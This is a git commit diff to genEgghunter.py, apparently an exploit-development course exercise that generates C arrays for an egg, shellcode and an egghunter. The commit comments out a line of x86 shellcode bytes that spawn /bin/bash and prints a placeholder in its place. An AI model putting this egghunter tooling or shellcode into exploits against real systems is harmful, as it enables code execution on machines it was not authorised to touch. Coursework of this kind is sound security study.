6e8e7a5ebd9d297d969b5a5376359c19241314ef
William Moody <william@debian.localdomain>
2022-01-04 10:34:42 -0500

    typo in genEgghunter

--- A3/genEgghunter.py
+++ A3/genEgghunter.py
@@ -70,8 +70,8 @@ sc = dumpShellcodeFromFile("tmp")
 print()
 
 print("char egg[] = \"%s\";" % ("".join(["\\x%.2x" % i for i in egg])))
-#print("... your shellcode here ...")
-print("char shellcode[] = \"\\x31\\xc0\\xb0\\x68\\x50\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";")
+print("char shellcode[] = ...")
+#print("char shellcode[] = \"\\x31\\xc0\\xb0\\x68\\x50\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc0\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";")
 print("char egghunter[] = %s;"%sc)
 
 print()
